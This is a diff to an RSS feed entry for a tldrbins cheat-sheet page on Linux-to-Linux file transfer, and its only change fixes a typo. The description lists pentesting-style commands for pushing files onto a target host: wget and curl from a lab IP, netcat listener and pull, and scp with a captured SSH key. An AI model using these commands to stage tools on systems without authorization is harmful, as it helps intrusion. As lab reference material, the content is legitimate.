@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
-      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have assh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
+      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have a ssh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
     </item>
   </channel>
 </rss>
